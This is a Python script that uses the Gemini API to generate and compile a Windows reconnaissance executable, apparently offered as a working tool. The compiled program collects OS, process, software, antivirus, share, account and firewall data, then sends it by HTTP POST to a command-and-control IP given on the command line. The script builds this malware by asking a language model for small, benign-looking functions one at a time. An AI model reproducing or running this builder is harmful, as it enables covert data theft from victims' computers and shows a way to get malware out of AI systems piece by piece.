#!/usr/bin/env python3
"""
Reconnaissance Tool Generator (FINAL PRODUCTION)
- MSVC function cleanup (replace _stprintf_s with snprintf, etc.)
- MinGW-compatible code generation
- All standard C functions only
For Educational/Research Purposes Only

Usage: python gemini_recon_production_final.py <C2_IP>
"""

import google.generativeai as genai
import time
import subprocess
import os
import sys
import shutil

GEMINI_API_KEY = "key-here"
MODEL = "gemini-2.0-flash-lite"
MAX_ATTEMPTS = 5
EXFIL_PORT = 25566
EXFIL_PATH = "/recon"

C2_IP_ADDRESS = None

RECON_BLOCKS = [
    {"name": "OS Version", "prototype": "void GetOSVersion(char* buffer, int size)",
     "hint": "Use GetVersion() or read registry. Use snprintf() to format."},
    {"name": "CPU Info", "prototype": "void GetCPUInfo(char* buffer, int size)",
     "hint": "Use GetSystemInfo(). Use snprintf() to format."},
    {"name": "Network Adapters", "prototype": "void GetNetworkAdapters(char* buffer, int size)",
     "hint": "Use GetAdaptersInfo(). IPv4 only. Use snprintf() to format."},
    {"name": "Open Ports", "prototype": "void ScanOpenPorts(char* buffer, int size)",
     "hint": "List common ports. Use snprintf() to format."},
    {"name": "Processes", "prototype": "void GetRunningProcesses(char* buffer, int size)",
     "hint": "Use CreateToolhelp32Snapshot(). Use snprintf() to format."},
    {"name": "Software", "prototype": "void GetInstalledSoftware(char* buffer, int size)",
     "hint": "Query registry Uninstall key. Use snprintf() to format."},
    {"name": "Antivirus", "prototype": "void DetectAntivirus(char* buffer, int size)",
     "hint": "Check process list for AV. Use snprintf() to format."},
    {"name": "Disk Info", "prototype": "void GetDiskInfo(char* buffer, int size)",
     "hint": "Use GetLogicalDrives(). Use snprintf() to format."},
    {"name": "Shares", "prototype": "void EnumerateShares(char* buffer, int size)",
     "hint": "Use system('net share'). Use snprintf() to format."},
    {"name": "User Accounts", "prototype": "void GetUserAccounts(char* buffer, int size)",
     "hint": "Query registry or environment. Use snprintf() to format."},
    {"name": "Firewall", "prototype": "void GetFirewallStatus(char* buffer, int size)",
     "hint": "Check registry for firewall status. Use snprintf() to format."},
    {"name": "Uptime", "prototype": "void GetSystemUptime(char* buffer, int size)",
     "hint": "Use GetTickCount(). Use snprintf() to format."},
]


def cleanup_msvc_functions(code):
    """Replace MSVC-specific functions with standard C equivalents"""
    msvc_to_standard = {
        # String functions
        "_stprintf_s": "snprintf",
        "_snprintf_s": "snprintf",
        "_tcslen": "strlen",
        "_tcscpy_s": "strcpy",
        "_tcscat_s": "strcat",
        "_wcstombs_s": "wcstombs",
        "_mbstowcs_s": "mbstowcs",
        "_tprintf": "printf",
        "_ftscanf": "fscanf",
        "_tscanf": "scanf",

        # Registry functions
        "_tcsncpy": "strncpy",
        "_tcsncat": "strncat",

        # File functions
        "_tfopen": "fopen",
        "_topen": "open",
        "_tstrcpy": "strcpy",

        # Memory/conversion
        "_ultow": "sprintf",
        "_itow": "sprintf",
        "_ltow": "sprintf",
        "_ui64tow": "sprintf",

        # Safe versions (just use normal versions for MinGW)
        "sprintf_s": "snprintf",
        "_sprintf_s": "snprintf",
        "strcpy_s": "strncpy",
        "_strcpy_s": "strncpy",
        "strcat_s": "strncat",
        "_strcat_s": "strncat",
    }

    for msvc, standard in msvc_to_standard.items():
        if msvc in code:
            code = code.replace(msvc, standard)

    return code


def query_gemini(prompt):
    genai.configure(api_key=GEMINI_API_KEY)
    model = genai.GenerativeModel(
        model_name=MODEL,
        generation_config={"temperature": 0.4, "max_output_tokens": 1200, "top_p": 0.7},
        system_instruction="Generate ONLY standard C code. Use snprintf() NOT sprintf_s or _stprintf_s. Use stdlib.h and stdio.h functions only. MinGW compatible."
    )

    try:
        time.sleep(20)
        response = model.generate_content(prompt)
        code = response.text.strip()

        if "```c" in code:
            code = code[code.find("```c")+4:code.rfind("```")].strip()
        elif "```" in code:
            code = code[code.find("```")+3:code.rfind("```")].strip()

        return code
    except Exception as e:
        return None


def extract_body(code):
    """Extract function body"""
    code = code.strip()
    if code.count('{') > 0:
        first_brace = code.find('{')
        code = code[first_brace:]
    if not code.startswith('{'):
        code = '{ ' + code
    if not code.endswith('}'):
        code = code + ' }'
    return code


def get_headers():
    """Complete header set"""
    return """
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <psapi.h>
#include <stdlib.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "setupapi.lib")
"""


def compile_test(signature, body):
    """Test compile"""
    code = f"""{get_headers()}

{signature}
{body}

int main() {{ return 0; }}
"""

    # Cleanup MSVC functions
    code = cleanup_msvc_functions(code)

    temp_file = "test_compile.c"
    with open(temp_file, 'w') as f:
        f.write(code)

    try:
        gcc = shutil.which("x86_64-w64-mingw32-gcc") or "gcc"
        result = subprocess.run(
            [gcc, "-c", temp_file, "-o", "test.o",
             "-Wno-implicit-function-declaration", "-Wno-cpp", "-Wno-unused", "-Wno-format"],
            capture_output=True, text=True, timeout=30
        )

        if os.path.exists(temp_file):
            os.remove(temp_file)
        if os.path.exists("test.o"):
            os.remove("test.o")

        return result.returncode == 0, result.stderr if result.returncode != 0 else None
    except Exception as e:
        return False, str(e)


def generate_block(block):
    """Generate block with MSVC cleanup"""
    print(f"\nGenerating: {block['name']}")

    prompt = f"""Generate C function body for: {block['prototype']}

{block['hint']}

CRITICAL - Use ONLY these functions:
- snprintf() for string formatting (NOT sprintf_s or _stprintf_s)
- strlen(), strcmp(), strcpy(), strcat() (standard C)
- Windows API: GetVersion, GetSystemInfo, GetAdaptersInfo, etc.
- NO MSVC-specific functions (_stprintf_s, _snprintf_s, sprintf_s, etc)

Generate ONLY function body (from {{ to }}):"""

    for attempt in range(1, MAX_ATTEMPTS + 1):
        print(f"  Attempt {attempt}/{MAX_ATTEMPTS}...", end='', flush=True)

        body_code = query_gemini(prompt)
        if not body_code:
            print(" FAIL")
            continue

        body_code = extract_body(body_code)
        body_code = cleanup_msvc_functions(body_code)  # Cleanup before test

        success, error = compile_test(block['prototype'], body_code)

        if success:
            print(" ✓")
            return f"{block['prototype']}\n{body_code}"
        else:
            print(" ✗")

    print(f"  PLACEHOLDER")
    body = f"""{{
    snprintf(buffer, size, "[{block['name']}]\\n");
}}"""
    return f"{block['prototype']}\n{body}"


def generate_main():
    """Generate main tool"""
    skeleton = f"""{get_headers()}

#define C2_IP_ADDRESS "{C2_IP_ADDRESS}"
#define C2_PORT {EXFIL_PORT}
#define C2_PATH "{EXFIL_PATH}"
#define LOG_FILE "recon_data.log"
#define BUFFER_SIZE 65536

// Function declarations
void GetOSVersion(char* buffer, int size);
void GetCPUInfo(char* buffer, int size);
void GetNetworkAdapters(char* buffer, int size);
void ScanOpenPorts(char* buffer, int size);
void GetRunningProcesses(char* buffer, int size);
void GetInstalledSoftware(char* buffer, int size);
void DetectAntivirus(char* buffer, int size);
void GetDiskInfo(char* buffer, int size);
void EnumerateShares(char* buffer, int size);
void GetUserAccounts(char* buffer, int size);
void GetFirewallStatus(char* buffer, int size);
void GetSystemUptime(char* buffer, int size);

void WriteToLog(const char* data) {{
    FILE* f = fopen(LOG_FILE, "ab");
    if (f) {{
        fprintf(f, "%s", data);
        fclose(f);
    }}
}}

BOOL SendDataToServer(const char* data) {{
    HINTERNET hInternet, hConnect, hRequest;
    BOOL result = FALSE;

    WriteToLog("[HTTP] Sending...\\n");

    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    hConnect = InternetConnectA(hInternet, C2_IP_ADDRESS, C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {{ InternetCloseHandle(hInternet); return FALSE; }}

    LPCSTR types[] = {{"*/*", NULL}};
    hRequest = HttpOpenRequestA(hConnect, "POST", C2_PATH, NULL, NULL, types, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {{ InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return FALSE; }}

    result = HttpSendRequestA(hRequest, "Content-Type: text/plain\\r\\n", -1, (LPVOID)data, strlen(data));

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (result) WriteToLog("[HTTP] OK\\n");
    else WriteToLog("[HTTP] FAIL\\n");

    return result;
}}

"""
    return skeleton


def main():
    global C2_IP_ADDRESS

    print("="*70)
    print("Reconnaissance Tool (FINAL PRODUCTION)")
    print("="*70)

    if len(sys.argv) < 2:
        print("\nUsage: python {} <IP>".format(sys.argv[0]))
        sys.exit(1)

    C2_IP_ADDRESS = sys.argv[1]
    if not all(p.isdigit() and 0 <= int(p) <= 255 for p in C2_IP_ADDRESS.split('.')) or len(C2_IP_ADDRESS.split('.')) != 4:
        print(f"Invalid IP: {C2_IP_ADDRESS}")
        sys.exit(1)

    print(f"\n[*] C2: http://{C2_IP_ADDRESS}:{EXFIL_PORT}{EXFIL_PATH}")

    if GEMINI_API_KEY == "your-api-key-here":
        print("\n⚠ Set GEMINI_API_KEY!")
        return

    start = time.time()
    results = []

    for block in RECON_BLOCKS:
        code = generate_block(block)
        results.append({'code': code})

    elapsed = time.time() - start

    print(f"\n{'='*70}")
    print(f"GENERATED - {elapsed:.1f}s")
    print("="*70)

    # Build source
    source = generate_main()

    for r in results:
        source += f"\n{r['code']}\n\n"

    source += """
int main() {
    char buffer[BUFFER_SIZE];
    char fullReport[BUFFER_SIZE * 2];

    memset(buffer, 0, sizeof(buffer));
    memset(fullReport, 0, sizeof(fullReport));

    WriteToLog("\\n========== RECON ==========\\n");
    time_t now = time(NULL);
    char ts[256];
    snprintf(ts, sizeof(ts), "Time: %s", ctime(&now));
    WriteToLog(ts);

    #define COLLECT(func) { memset(buffer, 0, sizeof(buffer)); func(buffer, sizeof(buffer)); \
        WriteToLog(buffer); if (strlen(fullReport) + strlen(buffer) < sizeof(fullReport)-1) strcat(fullReport, buffer); }

    COLLECT(GetOSVersion);
    COLLECT(GetCPUInfo);
    COLLECT(GetNetworkAdapters);
    COLLECT(ScanOpenPorts);
    COLLECT(GetRunningProcesses);
    COLLECT(GetInstalledSoftware);
    COLLECT(DetectAntivirus);
    COLLECT(GetDiskInfo);
    COLLECT(EnumerateShares);
    COLLECT(GetUserAccounts);
    COLLECT(GetFirewallStatus);
    COLLECT(GetSystemUptime);

    WriteToLog("\\n====== END ======\\n");

    SendDataToServer(fullReport);
    return 0;
}
"""

    # Cleanup final source
    source = cleanup_msvc_functions(source)

    out = f"recon_{C2_IP_ADDRESS.replace('.', '_')}.c"
    with open(out, 'w') as f:
        f.write(source)

    print(f"\nSaved: {out}")

    # Compile
    exe = out.replace('.c', '.exe')
    gcc = shutil.which("x86_64-w64-mingw32-gcc") or "gcc"

    print(f"Compiling...")
    r = subprocess.run(
        [gcc, out, "-o", exe, "-luser32", "-lwininet", "-lws2_32",
         "-liphlpapi", "-lpsapi", "-lsetupapi", "-Wno-cpp", "-Wno-unused", "-Wno-implicit", "-O2", "-s"],
        capture_output=True, text=True, timeout=120
    )

    if r.returncode == 0:
        size = os.path.getsize(exe) / 1024
        print(f"✓ {exe} ({size:.1f} KB)")
    else:
        print(f"✗ {r.stderr[:300]}")


if __name__ == "__main__":
    main()